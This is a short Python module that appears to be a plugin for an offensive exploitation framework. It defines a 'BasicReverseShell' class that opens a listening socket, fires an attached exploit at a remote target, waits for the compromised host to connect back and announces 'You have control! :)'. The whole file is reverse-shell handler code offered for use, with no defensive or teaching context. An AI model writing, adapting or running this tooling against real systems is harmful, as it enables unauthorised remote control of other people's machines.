import socket
import typing

from pytoolcore import style
from core import shellcore


class BasicReverseShell(shellcore.AsynchronousBasicRemoteShell):

    AUTHOR: str = "Danakane"
    SHELLREF: str = "BasicReverseShell"

    def __init__(self)->None:
        shellcore.AsynchronousBasicRemoteShell.__init__(self)
        self.customize(BasicReverseShell.AUTHOR, BasicReverseShell.SHELLREF)

    def initialize(self)->None:
        lskt = socket.socket(self.protocol, socket.SOCK_STREAM)
        lskt.bind(self.lsockaddr)
        lskt.listen(1)
        self.exploit.run(self.rsockaddr)
        print(style.Style.info("Waiting for incoming connection..."))
        skt, addr = lskt.accept()
        self.shellskt = skt
        lskt.close()
        client: str = self.shellskt.getpeername()[0]
        print(style.Style.success(client + " connected back."))
        print(style.Style.success("You have control! :)"))


blueprint: typing.Callable = BasicReverseShell
name: str = BasicReverseShell.SHELLREF
